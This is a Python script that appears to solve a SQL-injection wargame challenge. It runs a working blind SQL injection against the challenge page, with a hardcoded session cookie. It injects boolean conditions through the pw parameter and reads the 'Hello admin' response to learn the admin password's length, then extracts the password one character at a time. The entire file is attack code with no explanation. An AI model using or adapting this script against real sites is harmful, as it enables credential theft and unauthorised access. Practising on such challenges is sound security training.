import requests, time

flag = ''
length= 0
 
session = dict(PHPSESSID="o6eanf2bo08v2saogks4o19526")
 
# find the length of PW 
for i in range(0, 20):
    try:
        r = requests.post("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and length(pw)="+str(i)+"%23", cookies=session)
    except:
        print("exception")
        continue
    if 'Hello admin' in r.text: #true
        length = i
        break
 
print("[+]  Length of admin pw : " + str(length))
 
for j in range(1, length+1):
    for i in range(48, 126):
        try:
            r = requests.post("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and substr(pw,"+str(j)+",1) ='"+ str(chr(i)), cookies=session)
        except:
            print("exception")
            continue
        if 'Hello admin' in r.text:
            flag = flag + chr(i)
            print("[+] finding pw : " + flag)
            break
        time.sleep(0.1)
print("[+] pw of admin : " + flag)